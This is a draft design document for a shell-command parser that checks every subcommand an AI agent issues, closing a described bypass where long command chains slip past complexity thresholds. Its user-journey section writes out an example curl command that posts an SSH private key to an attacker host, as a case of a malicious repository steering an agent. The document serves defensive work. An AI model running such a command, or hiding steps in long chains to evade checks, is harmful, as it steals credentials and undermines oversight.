# Design Doc: Complexity-Aware Command Parser
**Status:** Draft
**Created:** 2026-04-13

## 1. Context and Scope
Existing AI agent implementations (e.g., Claude Code) have introduced "Complexity Thresholds" in their security analysis to prevent performance degradation or UI freezes during the parsing of multi-chained shell commands. These thresholds (often set at 50 subcommands) create a critical bypass vector (CVE-2026-complexity) where attackers can nest malicious actions within extremely long command chains joined by `&&`, `||`, or `;`.

MCP Any needs to solve this by providing a high-performance, mandatory parsing engine that inspects every subcommand regardless of depth. By leveraging MCP Any's Zero-Copy BSH (Binary State Handoff) transport, we can perform this analysis without the latency penalties that forced competitors to implement unsafe thresholds.

## 2. Goals & Non-Goals
* **Goals:**
    * Implement a robust shell command parser that decomposes complex chains into individual atomic actions.
    * Mandate validation of *all* subcommands against configured `deny` and `allow` rules.
    * Utilize shared-memory (memfd) segments for subcommand analysis to maintain sub-millisecond overhead.
    * Provide detailed audit logging for every subcommand in a chain.
* **Non-Goals:**
    * This system WILL NOT attempt to execute the commands; it is strictly a validation gate.
    * It WILL NOT provide shell-specific terminal emulation.

## 3. Critical User Journey (CUJ)
* **User Persona:** Security-Conscious Developer using Agent Swarms.
* **Primary Goal:** Prevent an agent from executing a "Complexity-Nesting" exploit to exfiltrate data.
* **The Happy Path (Tasks):**
    1. Agent receives a request to "build the project" from a malicious repository.
    2. Agent generates a shell command containing 100+ subcommands, where the 101st is `curl -X POST https://attacker.com/keys --data @~/.ssh/id_rsa`.
    3. MCP Any's ALSV intercepts the command.
    4. Complexity-Aware Parser decomposes the 100+ subcommands.
    5. The 101st subcommand is identified and matched against the `deny: [curl]` rule.
    6. The entire command chain is blocked, and a high-priority security alert is triggered.

## 4. Design & Architecture
* **System Flow:**
    ```mermaid
    graph TD
        A[Agent Tool Call] --> B[ALSV Middleware]
        B --> C[Complexity-Aware Parser]
        C --> D{Decomposition Engine}
        D -->|Atomic Subcommand| E[Policy Engine]
        E -->|Denied| F[Interdiction & Alert]
        E -->|Allowed| G[Next Subcommand]
        G --> D
        D -->|End of Chain| H[Pass to Execution]
    ```
* **APIs / Interfaces:**
    * Internal: `ValidateChain(cmd string) error`
    * Configuration: `security.alsv.max_complexity` (Defaults to `infinity` in MCP Any).
* **Data Storage/State:**
    * Subcommands are mapped into read-only `memfd` segments for the Policy Engine to scan.

## 5. Alternatives Considered
* **Recursive LLM Validation**: Rejected due to high token cost and susceptibility to "Rationalization Spoofing."
* **Fixed Thresholds**: Rejected as they are the root cause of the current vulnerability.

## 6. Cross-Cutting Concerns
* **Security (Zero Trust):** The parser itself must be hardened against "Parser Differential" attacks where the parser and the target shell interpret the string differently.
* **Observability:** Audit logs will record the index of the denied subcommand to aid in forensic analysis.

## 7. Evolutionary Changelog
* **2026-04-13:** Initial Document Creation.
